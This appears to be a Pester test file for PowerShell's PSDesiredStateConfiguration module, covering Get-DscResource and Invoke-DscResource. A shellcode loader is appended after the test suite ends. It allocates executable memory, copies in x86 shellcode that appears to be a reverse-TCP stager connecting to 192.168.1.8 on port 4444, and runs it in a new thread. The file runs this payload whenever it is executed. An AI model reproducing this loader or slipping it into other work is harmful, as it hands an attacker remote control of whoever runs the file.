

Function Install-ModuleIfMissing {
    param(
        [parameter(Mandatory)]
        [String]
        $Name,
        [version]
        $MinimumVersion,
        [switch]
        $SkipPublisherCheck,
        [switch]
        $Force
    )

    $module = Get-Module -Name $Name -ListAvailable -ErrorAction Ignore | Sort-Object -Property Version -Descending | Select-Object -First 1

    if (!$module -or $module.Version -lt $MinimumVersion) {
        Write-Verbose "Installing module '$Name' ..." -Verbose
        Install-Module -Name $Name -Force -SkipPublisherCheck:$SkipPublisherCheck.IsPresent
    }
}

Function Test-IsInvokeDscResourceEnable {
    return [ExperimentalFeature]::IsEnabled("PSDesiredStateConfiguration.InvokeDscResource")
}

Describe "Test PSDesiredStateConfiguration" -tags CI {
    Context "Module loading" {
        BeforeAll {
            Function BeCommand {
                [CmdletBinding()]
                Param(
                    [object[]] $ActualValue,
                    [string] $CommandName,
                    [string] $ModuleName,
                    [switch]$Negate
                )

                $failure = if ($Negate) {
                    "Expected: Command $CommandName should not exist in module $ModuleName"
                }
                else {
                    "Expected: Command $CommandName should exist in module $ModuleName"
                }

                $succeeded = if ($Negate) {
                    ($ActualValue | Where-Object { $_.Name -eq $CommandName }).count -eq 0
                }
                else {
                    ($ActualValue | Where-Object { $_.Name -eq $CommandName }).count -gt 0
                }

                return [PSCustomObject]@{
                    Succeeded = $succeeded
                    FailureMessage = $failure
                }
            }

            Add-AssertionOperator -Name 'HaveCommand' -Test $Function:BeCommand -SupportsArrayInput

            $commands = Get-Command -Module PSDesiredStateConfiguration
        }

        It "The module should have the Configuration Command" {
            $commands | Should -HaveCommand -CommandName 'Configuration' -ModuleName PSDesiredStateConfiguration
        }

        It "The module should have the Configuration Command" {
            $commands | Should -HaveCommand -CommandName 'New-DscChecksum' -ModuleName PSDesiredStateConfiguration
        }

        It "The module should have the Get-DscResource Command" {
            $commands | Should -HaveCommand -CommandName 'Get-DscResource' -ModuleName PSDesiredStateConfiguration
        }

        It "The module should have the Invoke-DscResource Command" -Skip:(!(Test-IsInvokeDscResourceEnable)) {
            $commands | Should -HaveCommand -CommandName 'Invoke-DscResource' -ModuleName PSDesiredStateConfiguration
        }
    }
    Context "Get-DscResource - Composite Resources" {
        BeforeAll {
            $origProgress = $global:ProgressPreference
            $global:ProgressPreference = 'SilentlyContinue'
            Install-ModuleIfMissing -Name PSDscResources
            $testCases = @(
                @{
                    TestCaseName = 'case mismatch in resource name'
                    Name         = 'groupset'
                    ModuleName   = 'PSDscResources'
                }
                @{
                    TestCaseName = 'Both names have matching case'
                    Name         = 'GroupSet'
                    ModuleName   = 'PSDscResources'
                }
                @{
                    TestCaseName = 'case mismatch in module name'
                    Name         = 'GroupSet'
                    ModuleName   = 'psdscResources'
                }
            )
        }

        AfterAll {
            $Global:ProgressPreference = $origProgress
        }

        it "should be able to get <Name> - <TestCaseName>" -TestCases $testCases {
            param($Name)

            if ($IsWindows) {
                Set-ItResult -Pending -Because "Will only find script from PSDesiredStateConfiguration without modulename"
            }

            if ($IsLinux) {
                Set-ItResult -Pending -Because "https://github.com/PowerShell/PSDesiredStateConfiguration/issues/26"
            }

            $resource = Get-DscResource -Name $name
            $resource | Should -Not -BeNullOrEmpty
            $resource.Name | Should -Be $Name
            if (Test-IsInvokeDscResourceEnable) {
                $resource.ImplementationDetail | Should -BeNullOrEmpty
            }
            else {
                $resource.ImplementationDetail | Should -BeNullOrEmpty
            }

        }

        it "should be able to get <Name> from <ModuleName> - <TestCaseName>" -TestCases $testCases {
            param($Name, $ModuleName, $PendingBecause)

            if ($IsLinux) {
                Set-ItResult -Pending -Because "https://github.com/PowerShell/PSDesiredStateConfiguration/issues/26"
            }

            if ($PendingBecause) {
                Set-ItResult -Pending -Because $PendingBecause
            }

            $resource = Get-DscResource -Name $Name -Module $ModuleName
            $resource | Should -Not -BeNullOrEmpty
            $resource.Name | Should -Be $Name
            if (Test-IsInvokeDscResourceEnable) {
                $resource.ImplementationDetail | Should -BeNullOrEmpty
            }
            else {
                $resource.ImplementationDetail | Should -BeNullOrEmpty
            }
        }
    }

    Context "Get-DscResource - ScriptResources" {
        BeforeAll {
            $origProgress = $global:ProgressPreference
            $global:ProgressPreference = 'SilentlyContinue'

            Install-ModuleIfMissing -Name PSDscResources -Force

            
            Install-ModuleIfMissing -Name PowerShellGet -MinimumVersion '2.2.1'
            $module = Get-Module PowerShellGet -ListAvailable | Sort-Object -Property Version -Descending | Select-Object -First 1

            $psGetModuleSpecification = @{ModuleName = $module.Name; ModuleVersion = $module.Version.ToString() }
            $psGetModuleCount = @(Get-Module PowerShellGet -ListAvailable).Count
            $testCases = @(
                @{
                    TestCaseName = 'case mismatch in resource name'
                    Name         = 'script'
                    ModuleName   = 'PSDscResources'
                }
                @{
                    TestCaseName = 'Both names have matching case'
                    Name         = 'Script'
                    ModuleName   = 'PSDscResources'
                }
                @{
                    TestCaseName = 'case mismatch in module name'
                    Name         = 'Script'
                    ModuleName   = 'psdscResources'
                }
                
            )
        }

        AfterAll {
            $Global:ProgressPreference = $origProgress
        }

        it "should be able to get <Name> - <TestCaseName>" -TestCases $testCases {
            param($Name)

            if ($IsWindows) {
                Set-ItResult -Pending -Because "Will only find script from PSDesiredStateConfiguration without modulename"
            }

            if ($PendingBecause) {
                Set-ItResult -Pending -Because $PendingBecause
            }

            $resources = @(Get-DscResource -Name $name)
            $resources | Should -Not -BeNullOrEmpty
            foreach ($resource in $resource) {
                $resource.Name | Should -Be $Name
                if (Test-IsInvokeDscResourceEnable) {
                    $resource.ImplementationDetail | Should -Be 'ScriptBased'
                }
                else {
                    $resource.ImplementationDetail | Should -BeNullOrEmpty
                }

            }
        }

        it "should be able to get <Name> from <ModuleName> - <TestCaseName>" -TestCases $testCases {
            param($Name, $ModuleName, $PendingBecause)

            if ($IsLinux) {
                Set-ItResult -Pending -Because "https://github.com/PowerShell/PSDesiredStateConfiguration/issues/12 and https://github.com/PowerShell/PowerShellGet/pull/529"
            }

            if ($PendingBecause) {
                Set-ItResult -Pending -Because $PendingBecause
            }

            $resources = @(Get-DscResource -Name $name -Module $ModuleName)
            $resources | Should -Not -BeNullOrEmpty
            foreach ($resource in $resource) {
                $resource.Name | Should -Be $Name
                if (Test-IsInvokeDscResourceEnable) {
                    $resource.ImplementationDetail | Should -Be 'ScriptBased'
                }
                else {
                    $resource.ImplementationDetail | Should -BeNullOrEmpty
                }
            }
        }

        it "should throw when resource is not found" {
            Set-ItResult -Pending -Because "https://github.com/PowerShell/PSDesiredStateConfiguration/issues/17"
            {
                Get-DscResource -Name antoehusatnoheusntahoesnuthao -Module tanshoeusnthaosnetuhasntoheusnathoseun
            } |
            Should -Throw -ErrorId 'Microsoft.PowerShell.Commands.WriteErrorException,CheckResourceFound'
        }
    }
    Context "Get-DscResource - Class base Resources" {

        BeforeAll {
            $origProgress = $global:ProgressPreference
            $global:ProgressPreference = 'SilentlyContinue'
            Install-ModuleIfMissing -Name XmlContentDsc -Force
            $classTestCases = @(
                @{
                    TestCaseName = 'Good case'
                    Name         = 'XmlFileContentResource'
                    ModuleName   = 'XmlContentDsc'
                }
                @{
                    TestCaseName = 'Module Name case mismatch'
                    Name         = 'XmlFileContentResource'
                    ModuleName   = 'xmlcontentdsc'
                }
                @{
                    TestCaseName = 'Resource name case mismatch'
                    Name         = 'xmlfilecontentresource'
                    ModuleName   = 'XmlContentDsc'
                }
            )
        }

        AfterAll {
            $global:ProgressPreference = $origProgress
        }

        it "should be able to get class resource - <Name> from <ModuleName> - <TestCaseName>" -TestCases $classTestCases {
            param($Name, $ModuleName, $PendingBecause)

            if ($PendingBecause) {
                Set-ItResult -Pending -Because $PendingBecause
            }

            $resource = Get-DscResource -Name $Name -Module $ModuleName
            $resource | Should -Not -BeNullOrEmpty
            $resource.Name | Should -Be $Name
            if (Test-IsInvokeDscResourceEnable) {
                $resource.ImplementationDetail | Should -Be 'ClassBased'
            }
            else {
                $resource.ImplementationDetail | Should -BeNullOrEmpty
            }
        }

        it "should be able to get class resource - <Name> - <TestCaseName>" -TestCases $classTestCases {
            param($Name, $ModuleName, $PendingBecause)
            if ($IsWindows) {
                Set-ItResult -Pending -Because "https://github.com/PowerShell/PSDesiredStateConfiguration/issues/19"
            }

            if ($PendingBecause) {
                Set-ItResult -Pending -Because $PendingBecause
            }

            $resource = Get-DscResource -Name $Name
            $resource | Should -Not -BeNullOrEmpty
            $resource.Name | Should -Be $Name
            if (Test-IsInvokeDscResourceEnable) {
                $resource.ImplementationDetail | Should -Be 'ClassBased'
            }
            else {
                $resource.ImplementationDetail | Should -BeNullOrEmpty
            }
        }
    }
    Context "Invoke-DscResource" {
        BeforeAll {
            $origProgress = $global:ProgressPreference
            $global:ProgressPreference = 'SilentlyContinue'
            $module = Get-InstalledModule -Name PsDscResources -ErrorAction Ignore
            if ($module) {
                Write-Verbose "removing PSDscResources, tests will re-install..." -Verbose
                Uninstall-Module -Name PsDscResources -AllVersions -Force
            }
        }

        AfterAll {
            $Global:ProgressPreference = $origProgress
        }

        Context "mof resources" {
            BeforeAll {
                $dscMachineStatusCases = @(
                    @{
                        value          = '1'
                        expectedResult = $true
                    }
                    @{
                        value          = '$true'
                        expectedResult = $true
                    }
                    @{
                        value          = '0'
                        expectedResult = $false
                    }
                    @{
                        value          = '$false'
                        expectedResult = $false
                    }
                )

                Install-ModuleIfMissing -Name PowerShellGet -Force -SkipPublisherCheck -MinimumVersion '2.2.1'
                Install-ModuleIfMissing -Name xWebAdministration
                $module = Get-Module PowerShellGet -ListAvailable | Sort-Object -Property Version -Descending | Select-Object -First 1

                $psGetModuleSpecification = @{ModuleName = $module.Name; ModuleVersion = $module.Version.ToString() }
            }
            it "Set method should work" -Skip:(!(Test-IsInvokeDscResourceEnable)) {
                if (!$IsLinux) {
                    $result = Invoke-DscResource -Name PSModule -ModuleName $psGetModuleSpecification -Method set -Property @{
                        Name               = 'PsDscResources'
                        InstallationPolicy = 'Trusted'
                    }
                }
                else {
                    
                    Install-ModuleIfMissing -Name PsDscResources -Force
                }

                $result.RebootRequired | Should -BeFalse
                $module = Get-module PsDscResources -ListAvailable
                $module | Should -Not -BeNullOrEmpty -Because "Resource should have installed module"
            }
            it 'Set method should return RebootRequired=<expectedResult> when $global:DSCMachineStatus = <value>'  -Skip:(!(Test-IsInvokeDscResourceEnable))  -TestCases $dscMachineStatusCases {
                param(
                    $value,
                    $ExpectedResult
                )

                
                
                $result = Invoke-DscResource -Name Script -ModuleName PSDscResources -Method Set -Property @{TestScript = { Write-Output 'test'; return $false }; GetScript = { return @{ } }; SetScript = [scriptblock]::Create("`$global:DSCMachineStatus = $value;return") }
                $result | Should -Not -BeNullOrEmpty
                $result.RebootRequired | Should -BeExactly $expectedResult
            }

            it "Test method should return false"  -Skip:(!(Test-IsInvokeDscResourceEnable)) {
                $result = Invoke-DscResource -Name Script -ModuleName PSDscResources -Method Test -Property @{TestScript = { Write-Output 'test'; return $false }; GetScript = { return @{ } }; SetScript = { return } }
                $result | Should -Not -BeNullOrEmpty
                $result.InDesiredState | Should -BeFalse -Because "Test method return false"
            }

            it "Test method should return true"  -Skip:(!(Test-IsInvokeDscResourceEnable)) {
                $result = Invoke-DscResource -Name Script -ModuleName PSDscResources -Method Test -Property @{TestScript = { Write-Verbose 'test'; return $true }; GetScript = { return @{ } }; SetScript = { return } }
                $result | Should -BeTrue -Because "Test method return true"
            }

            it "Test method should return true with moduleSpecification"  -Skip:(!(Test-IsInvokeDscResourceEnable)) {
                $module = get-module PsDscResources -ListAvailable
                $moduleSpecification = @{ModuleName = $module.Name; ModuleVersion = $module.Version.ToString() }
                $result = Invoke-DscResource -Name Script -ModuleName $moduleSpecification -Method Test -Property @{TestScript = { Write-Verbose 'test'; return $true }; GetScript = { return @{ } }; SetScript = { return } }
                $result | Should -BeTrue -Because "Test method return true"
            }

            it "Invalid moduleSpecification"  -Skip:(!(Test-IsInvokeDscResourceEnable)) {
                Set-ItResult -Pending -Because "https://github.com/PowerShell/PSDesiredStateConfiguration/issues/17"
                $moduleSpecification = @{ModuleName = 'PsDscResources'; ModuleVersion = '99.99.99.993' }
                {
                    Invoke-DscResource -Name Script -ModuleName $moduleSpecification -Method Test -Property @{TestScript = { Write-Host 'test'; return $true }; GetScript = { return @{ } }; SetScript = { return } } -ErrorAction Stop
                } |
                Should -Throw -ErrorId 'InvalidResourceSpecification,Invoke-DscResource' -ExpectedMessage 'Invalid Resource Name ''Script'' or module specification.'
            }

            it "Resource with embedded resource not supported and a warning should be produced"  {

                if (!(Test-IsInvokeDscResourceEnable)) {
                    Set-ItResult -Skipped -Because "Feature not enabled"
                }

                if (!$IsMacOS) {
                    Set-ItResult -Skipped -Because "Not applicable on Windows and xWebAdministration resources don't load on linux"
                }

                try {
                    Invoke-DscResource -Name xWebSite -ModuleName 'xWebAdministration' -Method Test -Property @{TestScript = 'foobar' } -ErrorAction Stop -WarningVariable warnings
                }
                catch{
                    
                }

                $warnings.Count | Should -Be 1 -because "There should be 1 warning on macOS and Linux"
                $warnings[0] | Should -Match 'embedded resources.*not support'
            }

            it "Using PsDscRunAsCredential should say not supported" -Skip:(!(Test-IsInvokeDscResourceEnable)) {
                {
                    Invoke-DscResource -Name Script -ModuleName PSDscResources -Method Set -Property @{TestScript = { Write-Output 'test'; return $false }; GetScript = { return @{ } }; SetScript = {return}; PsDscRunAsCredential='natoheu'}  -ErrorAction Stop
                } |
                Should -Throw -ErrorId 'PsDscRunAsCredentialNotSupport,Invoke-DscResource'
            }

            
            it "Invalid module name" -Skip:(!(Test-IsInvokeDscResourceEnable)) {
                Set-ItResult -Pending -Because "https://github.com/PowerShell/PSDesiredStateConfiguration/issues/17"
                {
                    Invoke-DscResource -Name Script -ModuleName santoheusnaasonteuhsantoheu -Method Test -Property @{TestScript = { Write-Host 'test'; return $true }; GetScript = { return @{ } }; SetScript = { return } } -ErrorAction Stop
                } |
                Should -Throw -ErrorId 'Microsoft.PowerShell.Commands.WriteErrorException,CheckResourceFound'
            }

            it "Invalid resource name" -Skip:(!(Test-IsInvokeDscResourceEnable)) {
                if ($IsWindows) {
                    Set-ItResult -Pending -Because "https://github.com/PowerShell/PSDesiredStateConfiguration/issues/17"
                }

                {
                    Invoke-DscResource -Name santoheusnaasonteuhsantoheu -Method Test -Property @{TestScript = { Write-Host 'test'; return $true }; GetScript = { return @{ } }; SetScript = { return } } -ErrorAction Stop
                } |
                Should -Throw -ErrorId 'Microsoft.PowerShell.Commands.WriteErrorException,CheckResourceFound'
            }

            it "Get method should work"  -Skip:(!(Test-IsInvokeDscResourceEnable)) {
                if ($IsLinux) {
                    Set-ItResult -Pending -Because "https://github.com/PowerShell/PSDesiredStateConfiguration/issues/12 and https://github.com/PowerShell/PowerShellGet/pull/529"
                }

                $result = Invoke-DscResource -Name PSModule -ModuleName $psGetModuleSpecification -Method Get -Property @{ Name = 'PsDscResources' }
                $result | Should -Not -BeNullOrEmpty
                $result.Author | Should -BeLike 'Microsoft*'
                $result.InstallationPolicy | Should -BeOfType [string]
                $result.Guid | Should -BeOfType [Guid]
                $result.Ensure | Should -Be 'Present'
                $result.Name | Should -be 'PsDscResources'
                $result.Description | Should -BeLike 'This*DSC*'
                $result.InstalledVersion | should -BeOfType [Version]
                $result.ModuleBase | Should -BeLike '*PSDscResources*'
                $result.Repository | should -BeOfType [string]
                $result.ModuleType | Should -Be 'Manifest'
            }
        }

        Context "Class Based Resources" {
            BeforeAll {
                Install-ModuleIfMissing -Name XmlContentDsc -Force
            }

            AfterAll {
                $Global:ProgressPreference = $origProgress
            }

            BeforeEach {
                $testXmlPath = 'TestDrive:\test.xml'
                @'
<configuration>
<appSetting>
    <Test1/>
</appSetting>
</configuration>
'@ | Out-File -FilePath $testXmlPath -Encoding utf8NoBOM
                $resolvedXmlPath = (Resolve-Path -Path $testXmlPath).ProviderPath
            }

            it 'Set method should work'  -Skip:(!(Test-IsInvokeDscResourceEnable)) {
                param(
                    $value,
                    $ExpectedResult
                )

                $testString = '890574209347509120348'
                $result = Invoke-DscResource -Name XmlFileContentResource -ModuleName XmlContentDsc -Property @{Path = $resolvedXmlPath; XPath = '/configuration/appSetting/Test1'; Ensure = 'Present'; Attributes = @{ TestValue2 = $testString; Name = $testString } } -Method Set
                $result | Should -Not -BeNullOrEmpty
                $result.RebootRequired | Should -BeFalse
                $testXmlPath | Should -FileContentMatch $testString
            }
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

